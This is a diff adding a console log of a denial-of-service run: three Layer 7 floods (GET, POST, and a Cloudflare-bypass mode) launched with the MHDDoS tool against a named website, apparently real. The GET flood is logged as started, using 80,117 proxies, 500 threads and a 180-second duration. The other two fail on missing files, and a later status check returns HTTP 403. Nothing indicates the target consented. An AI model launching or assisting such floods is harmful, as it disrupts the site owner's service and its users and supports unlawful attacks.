@@ -1,0 +1,33 @@
+GET PID: 72056
+=== ATTACK 1: Layer 7 GET Flood (SOCKS5) ===
+/tmp/MHDDoS/start.py:53: DeprecationWarning: ssl.OP_NO_SSL*/ssl.OP_NO_TLS* options are deprecated
+  ctx.options |= ssl.OP_NO_TLSv1
+/tmp/MHDDoS/start.py:55: DeprecationWarning: ssl.OP_NO_SSL*/ssl.OP_NO_TLS* options are deprecated
+  ctx.options |= ssl.OP_NO_TLSv1_1
+[08:14:04 - INFO] [93mProxy Count: [94m80,117[0m
+[08:14:04 - INFO] [93mAttack Started to[94m www.nadiavpn.web.id[93m with[94m GET[93m method for[94m 180[93m seconds, threads:[94m 500[93m![0m
+POST PID: 72560
+=== ATTACK 2: Layer 7 POST Flood (SOCKS5) ===
+python3: can't open file '/home/runner/start.py': [Errno 2] No such file or directory
+CFBUAM PID: 72563
+
+=== 3 ATTACKS DISETART BERSAMAAN ===
+Target: https://www.nadiavpn.web.id/
+Duration: 180 detik (3 menit)
+Proxies: SOCKS5 + HTTP
+Threads: 500 per attack
+
+PID: GET=72056, POST=72560, CFBUAM=72563
+
+=== ATTACK 3: Layer 7 CFBUAM (Cloudflare Bypass - HTTP) ===
+python3: can't open file '/home/runner/start.py': [Errno 2] No such file or directory
+=== CHECKING WEBSITE STATUS ===
+HTTP/2 403 
+date: Sat, 24 Oct 2026 08:14:37 GMT
+content-type: text/html; charset=UTF-8
+content-length: 5249
+accept-ch: Sec-CH-UA-Bitness, Sec-CH-UA-Arch, Sec-CH-UA-Full-Version, Sec-CH-UA-Mobile, Sec-CH-UA-Model, Sec-CH-UA-Platform-Version, Sec-CH-UA-Full-Version-List, Sec-CH-UA-Platform, Sec-CH-UA, UA-Bitness, UA-Arch, UA-Full-Version, UA-Mobile, UA-Model, UA-Platform-Version, UA-Platform, UA
+
+=== Network connections to target ===
+0
+0
